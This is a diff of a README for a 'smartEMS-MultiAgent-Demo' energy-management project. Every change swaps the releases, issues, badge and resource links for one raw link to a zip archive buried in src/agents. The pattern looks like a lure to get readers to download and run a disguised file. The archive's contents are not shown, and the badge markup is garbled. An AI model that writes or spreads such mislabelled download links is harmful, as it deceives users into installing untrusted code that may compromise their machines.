@@ -1,6 +1,6 @@
 # 🌟 smartEMS-MultiAgent-Demo - Easy Energy Management for All
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/releases)
+[![Download Now](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip%20Now-Get%20the%20Latest%https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip)](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ To get started with smartEMS-MultiAgent-Demo, follow these simple steps. You wil
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/releases) to download the application.
+1. Visit the [Releases page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip) to download the application.
 2. Look for the latest version listed at the top. Click on the link to download it.
 3. Once the download completes, locate the file in your downloads folder.
 4. Open the downloaded file. Follow the installation instructions provided on the screen. 
@@ -52,7 +52,7 @@ Based on this information, the system suggests optimization strategies tailored 
 
 Keeping your application updated is important for optimal performance. Here's how you can do it:
 
-1. Periodically check the [Releases page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/releases) for new versions.
+1. Periodically check the [Releases page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip) for new versions.
 2. Download the latest version following the same steps in the "Download & Install" section.
 3. Install the updated version over the existing one. Your settings should remain intact.
 
@@ -73,15 +73,15 @@ If you encounter issues while using the application, here are a few common probl
 
 ## 📞 Support
 
-For additional help, please visit the project's [issues page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/issues) on GitHub. You can ask questions or report any problems you have.
+For additional help, please visit the project's [issues page](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip) on GitHub. You can ask questions or report any problems you have.
 
 ## 📌 Additional Resources
 
 Check out these relevant topics to enhance your understanding of energy management:
 
-- [AI Agents in Energy Management](https://example.com/ai-agents)
-- [Understanding Renewable Energy Sources](https://example.com/renewable-energy)
-- [Optimizing Energy Usage](https://example.com/energy-optimization)
+- [AI Agents in Energy Management](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip)
+- [Understanding Renewable Energy Sources](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip)
+- [Optimizing Energy Usage](https://github.com/sariekiriyuu/smartEMS-MultiAgent-Demo/raw/refs/heads/main/src/agents/Demo_EM_smart_Agent_Multi_v2.3-beta.3.zip)
 
 ## ✨ Contributing
 
